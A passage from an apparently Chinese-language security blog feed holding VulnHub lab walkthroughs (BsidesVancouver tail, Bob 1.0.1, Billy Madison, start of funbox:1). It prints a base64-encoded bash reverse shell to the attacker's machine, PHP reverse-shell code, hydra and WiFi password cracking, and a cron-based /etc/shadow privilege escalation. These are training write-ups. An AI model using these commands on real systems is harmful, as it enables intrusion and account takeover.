class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br><span class="hljs-comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span><br><span class="hljs-comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printit</span> (<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$string</span>&quot;</span>;&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这个是我用浏览器的<code>Hack-Tools</code>插件生成的反弹shell的代码，这个插件极力推荐，非常值得使用，功能非常多<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1249697e28c63b9efb401.png"><br>我们修改一个页面代码，然后保存，在本地监听之后去点击这个页面反弹shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/cdefe4ef83bea633783bd.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a8c8072f4a1bc2662f47e.png"></p><h1 id="🛡️-提升权限"><a href="#🛡️-提升权限" class="headerlink" title="🛡️ 提升权限"></a>🛡️ 提升权限</h1><p>反弹到shell后上传我们的辅助提权脚本并执行，然后找到一个我们可写的文件，且是由root用户计划执行的一个可执行文件<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b8237f35a9a13ce03254a.png"><br>我们可以在其中插入bash反弹shell语句<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/856478c182a28787d565d.png"><br>本来一般命令行后面的bash -i就行了，但是不知道为何，我只用bash -i的话无法反弹到shell，后面加了个bash -c后就行了<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/2f2bb349eecce1b6dfb66.png"></p><p>后面查阅了资料发现是脚本默认的是/bin/sh，而sh和bash有一定差距，sh好像也不支持/dev/tcp这样去形成一个tcp连接，如果把第一行的#!/bin/sh改为#!/bin/bash则一切安好</p><h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p><a href="https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/">BsidesVancouver下载链接</a><br><a href="https://github.com/LasCC/Hack-Tools">Hack-Tools插件项目地址</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp Bob 1.0.1</title>
    <link href="/vulnhub-wp-Bob-1-0-1/"/>
    <url>/vulnhub-wp-Bob-1-0-1/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-主机发现"><a href="#🖳-主机发现" class="headerlink" title="🖳 主机发现"></a>🖳 主机发现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.234.0/24<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a5481d6693dcb9790d551.png"><br>目标机器是:<strong>192.168.234.47</strong></p><h1 id="👁-服务扫描"><a href="#👁-服务扫描" class="headerlink" title="👁 服务扫描"></a>👁 服务扫描</h1><p>nmap常规扫描端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ sudo nmap -p- -sV 192.168.234.47 --min-rate 10000<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 15:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> bogon (192.168.234.47)<br>Host is up (0.000077s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT      STATE SERVICE VERSION<br>80/tcp    open  http    Apache httpd 2.4.25 ((Debian))<br>25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)<br>MAC Address: 08:00:27:C0:CC:74 (Oracle VirtualBox virtual NIC)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.69 seconds<br></code></pre></td></tr></table></figure><p>查看web页面，发现只是一个静态页面，查看源码也没有什么其他信息，然后在robots.txt中找到了一些信息<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f50e44fcfb0ee2323690d.png"><br>一个个访问，发现dev_shell是一个简单的webshell，可以远程执行我们的命令，但是过滤了一些关键字，可以试试base64绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(rightevil㉿kali)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.234.130/1234 0&gt;&amp;1&quot;</span> | <span class="hljs-built_in">base64</span>   <br>L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjM0LjEzMC8xMjM0IDA+JjEK<br>                                                                                                    <br>┌──(rightevil㉿kali)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjM0LjEzMC8xMjM0IDA+JjEK&quot;</span> | <span class="hljs-built_in">base64</span> -d | bash<br></code></pre></td></tr></table></figure><p>将第二条命令复制去webshell执行，同时在本地启动监听</p><h1 id="🚪🚶-获取权限"><a href="#🚪🚶-获取权限" class="headerlink" title="🚪🚶 获取权限"></a>🚪🚶 获取权限</h1><p>成功反弹到一个shell，我们可以用python尝试一下扩展一个交互性高一些的shell（如果有python的话）</p><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/682c80c1209b9225cff43.png"></p><p>通过查找，我们找到了一个密码文件以及一个gpg加密的文件<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1fe839cc4c416c8bfcdba.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/aee07719a02513829fede.png"><br>在Secret目录下，有一个可以运行的脚本，我们可以用他的首字母来组成一个密码<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/3167f62e2e59daaded6df.png"><br>(根据之前web的一个页面来看)<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9641f18628635ddff83c3.png"><br>但是我们无法用www-data去解密这个文件，我们用ssh登上其他用户，然后去解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seb@Milburg-High:/home/bob/Documents$ gpg -d login.txt.gpg<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6b8fba82a03a28289357c.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/3d2a135613b833a2aa586.png"></p><h1 id="🛡️-提升权限"><a href="#🛡️-提升权限" class="headerlink" title="🛡️ 提升权限"></a>🛡️ 提升权限</h1><p>然后我们登上bob</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">seb@Milburg-High:/home/bob/Documents$ su bob<br>Password: <br>bob@Milburg-High:~/Documents$ sudo -l<br>sudo: unable to resolve host Milburg-High<br>[sudo] password <span class="hljs-keyword">for</span> bob: <br>Matching Defaults entries <span class="hljs-keyword">for</span> bob on Milburg-High:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User bob may run the following commands on Milburg-High:<br>    (ALL : ALL) ALL<br>bob@Milburg-High:~/Documents$ <span class="hljs-built_in">id</span><br>uid=1001(bob) gid=1001(bob) <span class="hljs-built_in">groups</span>=1001(bob),27(sudo)<br></code></pre></td></tr></table></figure><p>发现有很大的sudo权限，我们直接用sudo提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">bob@Milburg-High:~/Documents$ sudo bash<br>sudo: unable to resolve host Milburg-High<br>root@Milburg-High:/home/bob/Documents<span class="hljs-comment"># whoami</span><br>root<br>root@Milburg-High:/home/bob/Documents<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@Milburg-High:/home/bob/Documents<span class="hljs-comment"># cd /</span><br>root@Milburg-High:/<span class="hljs-comment"># cat flag.txt </span><br>CONGRATS ON GAINING ROOT<br>        .-.<br>       (   )<br>        |~|       _.--._<br>        |~|~:<span class="hljs-string">&#x27;--~&#x27;</span>      |<br>        | | :   <span class="hljs-comment">#root   |</span><br>        | | :     _.--._|<br>        |~|~`<span class="hljs-string">&#x27;--~&#x27;</span><br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>   _____|_|_________ Thanks <span class="hljs-keyword">for</span> playing ~c0rruptedb1t<br>root@Milburg-High:/<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p><a href="https://www.vulnhub.com/entry/bob-101,226/">Bob 1.0.1下载</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp Billy Madison</title>
    <link href="/vulnhub-wp-Billy-Madison/"/>
    <url>/vulnhub-wp-Billy-Madison/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-主机发现"><a href="#🖳-主机发现" class="headerlink" title="🖳 主机发现"></a>🖳 主机发现</h1><p>熟悉的netdiscover -r</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">─$ sudo netdiscover -r 192.168.234.0/24<br> Currently scanning: Finished!   |   Screen View: Unique Hosts                                <br> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                   <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.234.45  00:0c:29:1f:87:52      1      60  VMware, Inc.                                    <br> 192.168.234.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                 <br> 192.168.234.177 c6:62:32:b7:68:66      1      60  Unknown vendor  <br></code></pre></td></tr></table></figure><p>目标机器是<strong>192.168.134.45</strong></p><h1 id="👁-服务扫描"><a href="#👁-服务扫描" class="headerlink" title="👁 服务扫描"></a>👁 服务扫描</h1><p>使用nmap对其进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- 192.168.234.45 --min-rate 8000 <br></code></pre></td></tr></table></figure><ul><li>–min-rate 设置最小发包速度为8000，在靶场环境可以快速扫描出结果<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/c84b44e68c831d5bb6b28.png"></p></blockquote></li></ul><h1 id="🚪🚶-获取权限"><a href="#🚪🚶-获取权限" class="headerlink" title="🚪🚶 获取权限"></a>🚪🚶 获取权限</h1><p>一个个探测，经过尝试，smb服务中有一个txt文件，里面提示我们eric的后门以及关闭了。</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/41c0b0d2d7080a15873d5.png"></p></blockquote><p>23端口用telnet连接后，给了我们一个提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.234.45 23<br>***** HAHAH! You<span class="hljs-string">&#x27;re banned for a while, Billy Boy!</span><br><span class="hljs-string">By the way, I caught you trying to hack my wifi - but the joke&#x27;</span>s on you!<br>I don<span class="hljs-string">&#x27;t use ROTten passwords like rkfpuzrahngvat anymore!</span><br><span class="hljs-string">Madison Hotels is as good as MINE!!!! *****</span><br></code></pre></td></tr></table></figure><p>这里给了一个rot13加密的一个字符串</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/997d24edcb9e3cfef5ae6.png"></p></blockquote><p>经过尝试后，这个解密后的字符串是一个web页面的路径<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5243bfc663b470d9c8a89.png"><br>从这个页面我们可以得到的信息有：</p><ul><li>veronica使用她的名字作为密码</li><li>有一个流量文件在这个路径下，也使用的和veronica相关的名字</li></ul><p>那我们先得到一个关于veronica的字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep veronica &gt; pass.txt<br></code></pre></td></tr></table></figure><p>使用dirbuster进行爆破</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4b9c05d1b0f0b5aa6a888.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/45f9abdf33ba98f49b30b.png"></p></blockquote><p>从这个流量文件中，我们可以分析出俩个重要信息</p><ul><li>eric在机器上有一个ftp账号</li><li>该机器的ftp使用了knock服务，需要以一个特定序列进行”敲门”后才会开放</li></ul><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/bc03ac5169c435d246ee1.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e959b7602674464eb0eb.png"><br>注：<a href="https://www.cnblogs.com/f-carey/p/16066178.html"><em>knock服务科普</em></a><br>无需多言，我们敲门<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b2ff23ee2f283b123522e.png"><br>注：<strong>若是登录ftp的时候报错有关passive的话先输入<code>passive</code>命令进入passive mode</strong></p><p>登录上ftp服务器后，在eric的目录下找到一个.note文件，里面记载了一个后门的打开方法，以及eric的ssh密码在veronica或者billy的目录下。我们爆破一下veronica的ftp试试<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6f4ea2dfef3d76ccca876.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l veronica -P pass.txt 192.168.234.45 ftp<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a8e6e8d7b87302c45e098.png"><br>登录上veronica后，我们可以找到一个eml文件和一个cap流量文件，把他下载下来分析一下后发现流量是wifi流量，邮件中也提到了这一点。而wifi的密码就是eric的ssh密码<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b33e1302ba9bb532d6706.png"><br>那我们用aircrack-ng爆破一下wifi密码试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e955d89673ed3fb7af75.png"><br>在爆破的同时，我们也发送一下邮件，激活后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.234.45 2525<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/01df918eb7c3f46a0f9b2.png"><br>现在我们再进行一个nmap扫描，查看是否有新的服务开启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -sV 192.168.234.45 --min-rate 10000<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ca57562e6a420ca63a14f.png"><br>我们可以使用<strong>eric:triscuit*</strong> 去ssh连接</p><h1 id="🛡️-提升权限"><a href="#🛡️-提升权限" class="headerlink" title="🛡️ 提升权限"></a>🛡️ 提升权限</h1><p>我们在本地开启python的web服务，然后在靶机上用wget下载辅助提权脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali:<br>python3 -m http.server 80<br><br>eric@BM:/tmp$ wget http://192.168.234.130/linpeas.sh<br>--2023-12-03 06:56:14--  http://192.168.234.130/linpeas.sh<br>Connecting to 192.168.234.130:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 847815 (828K) [text/x-sh]<br>Saving to: ‘linpeas.sh’<br><br>linpeas.sh               100%[==================================&gt;] 827.94K  --.-KB/s    <span class="hljs-keyword">in</span> 0.01s   <br><br>2023-12-03 06:56:14 (56.4 MB/s) - ‘linpeas.sh’ saved [847815/847815]<br><br>eric@BM:/tmp$ <span class="hljs-built_in">chmod</span> +x linpeas.sh <br></code></pre></td></tr></table></figure><p>运行脚本之后，我们可以找到一个有趣的文件<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eaf6f9ff3a060c400420b.png"><br>我们从整个eric的攻击流程可以知道他使用了一个钓鱼的手法让veronica下载了一个恶意文件，我们可以检查一下这个文件的md5值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">eric@BM:/tmp$ <span class="hljs-built_in">md5sum</span> /usr/local/share/sgml/donpcgd<br>cd3621324a40c20e54aad9ecef2f6ed5  /usr/local/share/sgml/donpcgd<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4da69d96a6ee138ed0189.png"><br>我们用google搜索dgcpnod后即可发现这个exploit的利用方法<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a001dcb36c87bcc9eb740.png"><br>而具体的exp如下<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d8d3433d6f3912a577e06.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">eric@BM:/tmp$ <span class="hljs-built_in">touch</span> /tmp/rootme; <span class="hljs-built_in">chmod</span> +x /tmp/rootme; /usr/local/share/sgml/donpcgd /tmp/rootme /etc/cron.hourly/rootme; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash \n chmod 777 /etc/shadow&#x27;</span> &gt; /etc/cron.hourly/rootme<br><span class="hljs-comment">#### mknod(/etc/cron.hourly/rootme,81fd,0)</span><br></code></pre></td></tr></table></figure><p>然后我们可以用watch命令监察/etc/shadow</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">watch -n 5 <span class="hljs-string">&quot;ls -la /etc/shadow&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>-n</code> 指定每次监察间隔<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b056a9c35d4c3ba2ea361.png"><br>这时我们就可以修改shadow文件来提权(稳妥起见可以先对shadow文件进行备份，不管是修改shadow文件还是passwd文件，原理都是一样的)<br>第一步：生成密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkpasswd -m sha-512 root <br></code></pre></td></tr></table></figure></li><li><code>-m</code> 加密指定模式<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/67e9daaeb42036fedf4f6.png"><br>第二步：将原来的hash值或者x(passwd文件)替换为我们生成的hash值<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/509f5e95160690c1bdcb2.png"><br>至此，提权成功，使用su切换到root用户<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f4f7a281a156d3ae7b58c.png"></li></ul><h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p><a href="https://www.vulnhub.com/entry/billy-madison-11,161/">Billy Madison下载</a><br><a href="https://documentation.meraki.com/MX/NAT_and_Port_Forwarding/Active_and_Passive_FTP_Overview_and_Configuration#:~:text=Passive%20FTP%20is%20an%20FTP,the%20connection%20to%20the%20server">ftp的passive模式</a><br><a href="https://www.youtube.com/watch?v=0gQiv_pkOPw">youtube视频 wp</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp funbox:1</title>
    <link href="/vulnhub-wp-funbox1/"/>
    <url>/vulnhub-wp-funbox1/</url>
    
    <content type="html"><![CDATA[<h1 id="🔍-信息收集-Enumeration"><a href="#🔍-信息收集-Enumeration" class="headerlink" title="🔍 信息收集(Enumeration)"></a>🔍 信息收集(Enumeration)</h1><h2 id="🖳-主机发现-Host-Discover"><a href="#🖳-主机发现-Host-Discover" class="headerlink" title="🖳 主机发现(Host Discover)"></a>🖳 主机发现(Host Discover)</h2><p>我们使用netdiscover命令扫描kali的c段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netdiscover -r 192.168.61.0/24  <br></code></pre></td></tr></table></figure><ul><li><code>-r</code> 指定网段<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7e214193ca77ae6d2758c.png"><br>发现目标机是<em>192.168.61.7</em></p></blockquote><h2 id="👁-端口扫描-Port-Scan"><a href="#👁-端口扫描-Port-Scan" class="headerlink" title="👁 端口扫描(Port Scan)"></a>👁 端口扫描(Port Scan)</h2>我们使用nmap进行一个全扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -p- 192.168.61.7 -sV <br></code></pre></td></tr></table></figure></li><li><code>-p-</code> 扫描全端口  (<em>注：这会产生比较大的流量</em>)</li><li><code>-sV</code> 探测端口服务<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e0b912d1bf1022b6b9223.png"><br>得到一个ftp，ssh，http还有一个类似mysql的服务</p></blockquote></li></ul><h2 id="🕵‍♂-服务探测-Service-Detection"><a href="#🕵‍♂-服务探测-Service-Detection" class="headerlink" title="🕵‍♂ 服务探测(Service Detection)"></a>🕵‍♂ 服务探测(Service Detection)</h2><p>我们先从最简单的开始，http，访问目标的80端口。</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/47643d14626051c3c09bd.png"><br>发现被重定向到了一个未知的url，那我们修改hosts文件把这个url绑定到目标ip，然后重新访问</p></blockquote><p>然后发现目标web的cms指纹是wp，那直接上专业工具</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a54e76bbe009bd9abcdd7.png"></p></blockquote><p>我们使用wpscan对目标网站进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan -e vp,vt,u --url http://funbox.fritz.box/<br></code></pre></td></tr></table></figure><ul><li><code>-e vp,vt,u</code>指定使用主题漏洞扫描(vt),插件漏洞扫描(vp)，用户扫描(u)</li><li><code>--url</code> 指定扫描目标<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/07382fb560a34d0ec3dd9.png"><br>发现枚举出了俩个用户，可以去登录界面试试弱口令</p></blockquote></li></ul><h1 id="🚪🚶-获取权限-Foothold"><a href="#🚪🚶-获取权限-Foothold" class="headerlink" title="🚪🚶 获取权限(Foothold)"></a>🚪🚶 获取权限(Foothold)</h1><h2 id="💲-ssh获取shell-ssh-get-shell"><a href="#💲-ssh获取shell-ssh-get-shell" class="headerlink" title="💲 ssh获取shell(ssh get shell)"></a>💲 ssh获取shell(ssh get shell)</h2><p>经过尝试，发现用户joe有弱口令<em>12345</em>，那我们可以联想到是否ftp和ssh也有弱口令？<br>直接上hydra(九头蛇)爆破试试，注：<em>在真实渗透测试中，我们应该尽量减少暴力破解的次数，或者应当在收集到了足够的信息再去爆破</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l joe -P top1000.txt -v 192.168.61.7 ssh -t 4<br></code></pre></td></tr></table></figure><ul><li><code>-l</code> 指定用户名</li><li><code>-P</code> 指定密码字典</li><li><code>-v</code> 指定详细信息输出，将会输出爆破进度</li><li><code>ip + 服务名</code></li><li><code>-t</code> 指定线程为4，在ssh爆破时，应使用hydra推荐的线程数4<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/094a4eac27394b27b02b9.png"><br>接下来我们就可以使用弱口令直接ssh登录joe用户</p></blockquote></li></ul><h2 id="🏃-rbash逃逸-rbash-escape"><a href="#🏃-rbash逃逸-rbash-escape" class="headerlink" title="🏃 rbash逃逸(rbash escape)"></a>🏃 rbash逃逸(rbash escape)</h2><p>我们可以发现，获取的是一个rbash，这个时候我们就要进行rbash逃逸。<br>注：<em>这里的pspy64文件是我之前打靶的时候就已经下载了的文件</em></p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eedad5d0b0978b28b260a.png"></p></blockquote><p>逃逸方法有很多种，我这里就用python来逃逸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>然后我们先看看mbox是个什么东西(一般自己家目录下都会有点东西提示)</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/56ae90f4639c80ade9244.png"><br>重点解读就是joe用户帮root用户写过一个脚本，还有joe用户将密码设成了12345</p></blockquote><h1 id="🛡️-权限提升-Privilege-Escalation"><a href="#🛡️-权限提升-Privilege-Escalation" class="headerlink" title="🛡️ 权限提升(Privilege Escalation)"></a>🛡️ 权限提升(Privilege Escalation)</h1><p>然后我们就是找这个脚本，后经过一番寻找，我们最终在funny的家目录下发现了backup脚本，还有一个网站的打包文件</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/13fc337e8d37e471ae16c.png"><br>到了这，我们可以猜测这个就是joe用户写的脚本，脚本里面的内容是对/var/www/html目录进行打包。那就很明显了，和网站备份相关的计划任务。</p></blockquote><p>为了验证我们的猜想，我们用pspy工具检测一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64<br><span class="hljs-built_in">chmod</span> +x pspy64<br>./pspy64 -d /home/funny<br></code></pre></td></tr></table></figure><ul><li><code>-d</code> 指定要观察的目录<br>pspy（也称为”pspy64”）是一个用于监视进程活动的工具，特别是在Linux环境中。它允许用户监视正在运行的进程，查看它们的活动和与文件系统的交互，以及与其他进程的通信。pspy是一个轻量级的工具，通常被用于安全审计和故障排除，也可以用于发现潜在的安全问题。<blockquote><p><img 